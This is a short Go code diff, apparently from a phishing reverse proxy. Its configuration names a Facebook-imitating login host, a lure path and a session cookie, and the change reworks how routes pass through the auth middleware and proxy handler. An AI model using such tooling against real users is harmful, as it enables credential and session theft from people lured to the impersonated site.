@@ -45,14 +45,29 @@ func main() {
 	})
 
 	app.Use(recover.New())
-	app.Use(NewAuthMiddleware(AuthConfig{
+	auth := NewAuthMiddleware(AuthConfig{
 		CookieName:     "session_id",
 		Store:          store,
 		InvalidAuthURL: "https://duckduckgo.com",
 		LoginURL:       fmt.Sprintf("https://www-facebook-com.host.juicyrout:%s/", port),
 		LureService:    NewStaticLureService([]string{"/abc/def"}),
-	}))
-	app.All("/*", NewProxyHandler(client, req, resp))
+	})
+	proxy := NewProxyHandler(client, req, resp)
+
+	// allowed HTTP methods with auth
+	httpMethods := []string{
+		fiber.MethodGet,
+		fiber.MethodHead,
+		fiber.MethodPost,
+		fiber.MethodPut,
+		fiber.MethodDelete,
+		fiber.MethodPatch,
+	}
+	for _, method := range httpMethods {
+		app.Add(method, "/*", auth, proxy)
+	}
+	// for CORS preflight requests
+	app.Options("/*", proxy)
 
 	if err := app.ListenTLS(":"+port, "cert.pem", "key.pem"); err != nil {
 		log.Println("listen error", err)
